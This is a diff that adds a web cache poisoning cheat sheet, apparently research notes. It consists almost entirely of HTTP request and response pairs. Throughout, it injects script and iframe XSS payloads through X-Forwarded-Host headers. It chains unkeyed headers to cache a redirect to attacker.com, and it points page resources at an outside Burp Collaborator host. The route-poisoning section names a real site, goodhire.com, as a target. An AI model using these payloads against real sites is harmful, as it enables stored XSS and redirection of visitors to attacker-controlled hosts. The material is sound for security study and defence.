@@ -1,0 +1,66 @@
+///////////Basic Cache Poisoning\\\\\\\\\\\
+
+GET /en?cb=1 HTTP/1.1
+X-Forwarded-Host: canary
+HTTP/1.1 200 OK
+<meta.. c="https://canary/cms/social.png" />
+
+GET /en?safe=1 HTTP/1.1
+X-Forwarded-Host: a.\"><script>alert(1)</script>
+HTTP/1.1 200 OK
+<meta… c="https://a.\"><script>alert(1)</script>
+
+GET / HTTP/1.1
+X-Forwarded-Host: a"><iframe onload=alert(1)>
+HTTP/1.1 200 OK
+<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
+
+GET /dataset HTTP/1.1
+X-Forwarded-Host: burpcollaborator.net
+HTTP/1.1 200 OK
+<body data-site-root="https://burpcollaborator.net/"
+
+###############################################
+/////////////Chaining Unkeyed Inputs\\\\\\\\\\\
+
+Host: redacted.net
+X-Forwarded-Host: xyz
+-------------------------------
+HTTP/1.1 200 OK
+Set-Cookie: locale=en; domain=xyz
+
+GET /en HTTP/1.1
+Host: redacted.net
+X-Forwarded-Scheme: nothttps
+-------------------------------
+HTTP/1.1 301 Moved Permanently
+Location: https://redacted.net
+
+GET /en HTTP/1.1
+Host: redacted.net
+X-Forwarded-Host: attacker.com
+X-Forwarded-Scheme: nothttps
+-------------------------------
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker.com/en
+
+################################
+///////Route Poisoning\\\\\\\\\\
+
+GET / HTTP/1.1
+Host: www.goodhire.com
+X-Forwarded-Server: canary
+-------------------------------
+HTTP/1.1 404 Not Found
+CF-Cache-Status: MISS
+<title>HubSpot - Page not found</title>
+<p>The domain canary does not exist in our system.</p>
+
+GET / HTTP/1.1
+Host: www.goodhire.com
+X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
+-------------------------------
+HTTP/1.1 200 OK
+<script>alert(document.domain)</script>
+
+
